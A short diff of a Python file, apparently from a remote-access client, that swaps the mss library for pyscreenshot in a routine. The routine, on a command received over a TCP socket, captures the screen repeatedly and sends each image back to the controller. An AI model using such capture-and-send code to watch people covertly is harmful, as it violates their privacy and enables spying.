@@ -8,7 +8,7 @@ import struct
 import requests
 import cv2
 import platform
-import mss
+import pyscreenshot
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
@@ -788,11 +788,11 @@ class TCP:
         n = int(params['-n']) if '-n' in params.keys() else 1
         t = float(params['-t']) if '-t' in params.keys() else 0.0
 
-        screen = mss.mss()
+        ubicacion = f"{directorio}/ss.png"
         i = 0
         while i < n:
-            ubicacion = f"{directorio}/ss.png"
-            screen.shot(output=ubicacion)
+            screenshot = pyscreenshot.grab()
+            screenshot.save(ubicacion)
             self.__sock.send(b'ok')
             self.enviarArchivo(ubicacion)
 
